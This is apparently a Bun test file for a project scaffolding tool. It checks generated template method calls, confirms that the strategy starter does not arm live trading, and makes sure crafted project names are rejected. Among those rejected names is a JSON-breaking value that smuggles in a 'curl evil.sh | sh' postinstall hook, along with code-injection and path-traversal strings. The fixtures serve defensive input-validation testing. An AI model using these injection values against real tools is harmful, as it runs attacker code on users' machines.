import { afterAll, describe, expect, test } from "bun:test";
import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { scaffoldProject } from "./scaffold.ts";
import { GordonSDKClient } from "./index.ts";

const roots: string[] = [];
function tmpTarget(): string {
  const dir = mkdtempSync(path.join(os.tmpdir(), "gordon-scaffold-"));
  roots.push(dir);
  return dir;
}

afterAll(() => {
  for (const dir of roots) rmSync(dir, { recursive: true, force: true });
});

/** Every `gordon.<name>(` call site in a generated entrypoint. */
function calledMethods(source: string): string[] {
  return [...source.matchAll(/\bgordon\.([A-Za-z_$][\w$]*)\s*\(/g)].map((m) => m[1]!);
}

function sdkMethods(): Set<string> {
  const names = new Set<string>();
  for (const key of Object.getOwnPropertyNames(GordonSDKClient.prototype)) {
    if (key === "constructor") continue;
    names.add(key);
  }
  return names;
}

describe("scaffoldProject", () => {
  for (const template of ["agent", "strategy"] as const) {
    test(`${template} template only calls methods the SDK exports`, async () => {
      const target = tmpTarget();
      await scaffoldProject(target, { name: "demo-project", template, packageManager: "bun" });
      const source = readFileSync(path.join(target, "src", "index.ts"), "utf-8");

      const called = calledMethods(source);
      expect(called.length).toBeGreaterThan(0);

      const available = sdkMethods();
      const missing = called.filter((m) => !available.has(m));
      expect(missing).toEqual([]);
    });
  }

  test("the strategy starter does not arm live trading", async () => {
    const target = tmpTarget();
    await scaffoldProject(target, { name: "demo-project", template: "strategy", packageManager: "bun" });
    const source = readFileSync(path.join(target, "src", "index.ts"), "utf-8");
    expect(source).not.toContain("gordon.arm(");
    expect(source).not.toContain("gordon.disarm(");
  });

  test("writes a package.json that parses and carries the project name", async () => {
    const target = tmpTarget();
    await scaffoldProject(target, { name: "demo-project", template: "agent", packageManager: "npm" });
    const pkg = JSON.parse(readFileSync(path.join(target, "package.json"), "utf-8"));
    expect(pkg.name).toBe("demo-project");
    expect(pkg.scripts.postinstall).toBeUndefined();
  });

  test("rejects a project name crafted to break out of the generated files", async () => {
    const injections = [
      'x","scripts":{"postinstall":"curl evil.sh | sh"},"y":"',
      'x"); process.exit(1); ("',
      "../../escape",
      "UPPER",
      "-leading-dash",
      "",
    ];
    for (const name of injections) {
      const target = tmpTarget();
      await expect(
        scaffoldProject(target, { name, template: "agent", packageManager: "bun" }),
      ).rejects.toThrow(/Invalid project name/);
    }
  });
});
